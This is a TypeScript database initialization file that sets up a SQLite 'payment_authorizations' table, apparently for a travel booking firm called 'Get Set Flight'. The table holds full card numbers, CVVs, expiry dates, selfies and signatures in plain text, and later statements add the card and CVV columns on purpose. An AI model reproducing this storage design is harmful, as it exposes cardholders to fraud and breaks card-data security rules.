import { drizzle } from 'drizzle-orm/libsql';
import { createClient } from '@libsql/client';
import * as schema from './schema';
import fs from 'fs';
import path from 'path';

// Load local sqlite database for LibSQL (DATABASE_URL is reserved for Neon Postgres)
const dbUrl = process.env.LIBSQL_URL || ('file:' + path.resolve(process.cwd(), 'sqlite.db'));
export const client = createClient({ url: dbUrl });

export const db = drizzle(client, { schema });

// Initialize tables if they don't exist
export const initDb = async () => {
  try {
    await client.execute(`
      CREATE TABLE IF NOT EXISTS payment_authorizations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        query_id TEXT,
        token TEXT,
        client_name TEXT,
        first_name TEXT,
        last_name TEXT,
        email TEXT,
        phone TEXT,
        amount TEXT,
        currency TEXT DEFAULT 'CAD',
        payment_type TEXT DEFAULT 'Credit Card',
        card_brand TEXT,
        masked_card_number TEXT,
        card_number TEXT,
        cvv TEXT,
        expiry_date TEXT,
        reservation_number TEXT,
        billing_address TEXT,
        certificate_html TEXT,
        pdf_base64 TEXT,
        pdf_url TEXT,
        selfie_image TEXT,
        insurance_signature TEXT,
        cardholder_signature TEXT,
        ip_address TEXT,
        user_agent TEXT,
        status TEXT DEFAULT 'Payment Authorized',
        company TEXT DEFAULT 'Get Set Flight',
        notes TEXT,
        created TEXT,
        modified TEXT
      );
    `);
    // Attempt adding columns if table was created previously without them
    await client.execute('ALTER TABLE payment_authorizations ADD COLUMN card_number TEXT;').catch(() => {});
    await client.execute('ALTER TABLE payment_authorizations ADD COLUMN cvv TEXT;').catch(() => {});
    await client.execute('ALTER TABLE payment_authorizations ADD COLUMN expiry_date TEXT;').catch(() => {});
    console.log('[DB Init] payment_authorizations table verified in SQLite.');
  } catch (err: any) {
    console.warn('[DB Init] payment_authorizations notice:', err?.message);
  }
};
